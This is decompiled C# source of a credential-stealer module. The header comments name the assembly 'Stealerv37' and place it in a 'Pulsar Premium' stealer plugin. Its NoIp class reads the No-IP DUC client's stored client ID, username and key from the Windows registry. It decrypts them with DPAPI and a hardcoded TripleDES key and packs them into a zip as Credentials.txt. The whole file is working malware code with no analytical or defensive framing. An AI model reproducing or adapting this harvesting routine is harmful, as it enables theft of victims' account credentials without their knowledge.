// Decompiled with JetBrains decompiler
// Type: Intelix.Targets.Applications.NoIp
// Assembly: Stealerv37, Version=1.0.0.0, Culture=neutral, PublicKeyToken=null
// MVID: D491006B-B4AE-4407-B02D-3CC101716992
// Assembly location: C:\Users\Administrator\Downloads\Pulsar Premium v2.4.5\Plugins\Stealer.Client.dll

using Intelix.Helper.Data;
using Intelix.Helper.Encrypted;
using Microsoft.Win32;
using System.Security.Cryptography;
using System.Text;

#nullable disable
namespace Intelix.Targets.Applications;

public class NoIp : ITarget
{
  public void Collect(InMemoryZip zip, Counter counter)
  {
    string name = "SOFTWARE\\Vitalwerks\\DUC\\v4";
    using (RegistryKey registryKey = Registry.CurrentUser.OpenSubKey(name))
    {
      if (registryKey == null)
        return;
      object message1 = registryKey.GetValue("CKey");
      object message2 = registryKey.GetValue("CID");
      object message3 = registryKey.GetValue("UserName");
      if (message1 == null && message2 == null && message3 == null)
        return;
      string str1 = this.DecryptString((byte[]) message2);
      string str2 = this.DecryptString((byte[]) message1);
      string str3 = this.DecryptString((byte[]) message3);
      string entryPath = "NoIp\\Credentials.txt";
      Counter.CounterApplications counterApplications = new Counter.CounterApplications();
      counterApplications.Name = nameof (NoIp);
      counterApplications.Files.Add($"{name} => {entryPath}");
      counterApplications.Files.Add(entryPath);
      zip.AddTextFile(entryPath, $"clientid: {str1}\nlogin: {str3}\npassword hash: {str2}");
      counter.Applications.Add(counterApplications);
    }
  }

  private string DecryptString(byte[] message)
  {
    try
    {
      if (message == null)
        return (string) null;
      byte[] inputBuffer = DpApi.Decrypt(message);
      if (inputBuffer == null)
        return (string) null;
      byte[] numArray = new byte[16 /*0x10*/]
      {
        (byte) 127 /*0x7F*/,
        (byte) 238,
        (byte) 115,
        (byte) 104,
        (byte) 83,
        (byte) 74,
        (byte) 138,
        (byte) 240 /*0xF0*/,
        (byte) 49,
        (byte) 50,
        (byte) 224 /*0xE0*/,
        (byte) 252,
        (byte) 103,
        (byte) 181,
        (byte) 23,
        (byte) 117
      };
      using (TripleDESCryptoServiceProvider cryptoServiceProvider = new TripleDESCryptoServiceProvider())
      {
        cryptoServiceProvider.Key = numArray;
        cryptoServiceProvider.Mode = CipherMode.ECB;
        cryptoServiceProvider.Padding = PaddingMode.PKCS7;
        using (ICryptoTransform decryptor = cryptoServiceProvider.CreateDecryptor())
          return Encoding.UTF8.GetString(decryptor.TransformFinalBlock(inputBuffer, 0, inputBuffer.Length));
      }
    }
    catch
    {
      return (string) null;
    }
  }
}
